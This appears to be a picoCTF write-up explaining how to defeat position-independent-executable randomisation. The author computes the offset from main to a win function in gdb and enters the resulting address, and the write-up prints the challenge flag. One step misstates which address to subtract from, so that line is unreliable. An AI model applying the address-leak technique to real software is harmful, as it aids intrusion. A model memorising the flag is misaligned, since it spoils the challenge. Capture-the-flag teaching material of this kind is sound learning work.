The program gives us a `vuln` binary, and the source code `vuln.c`. Analyzing the `vuln` file,
```bash
>> file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
```
I discovered that it is a PIE executable. Doing some basic research, I learnt that PIE refers to Position Independent Executables, where the memory addresses of the stack, the heap and address of functions (through ASLR). However, it only randomizes the "base" memory addresses, so the memory address offsets remain the same. To exploit these binaries, we oftentimes need it to leak the runtime memory addresses somehow.

Luckily for us, the binary gives us the address of the main function, saving us a lot of work. Analzying the binary through `gdb` we can see that:
```
Dump of assembler code for function win:
   0x00005555555552a7 <+0>:	endbr64
Dump of assembler code for function main:
   0x000055555555533d <+0>:	endbr64
```

Subtracting the offsets, we get that win is 150 bytes away from from the main function. So to jump to the win function, we need to take the runtime memory address of the win function and subtract 150 from it.

```
Address of main: 0x61b60994b33d
Enter the address to jump to, ex => 0x12345: 0x61b60994b2a7
Your input: 61b60994b2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3}
```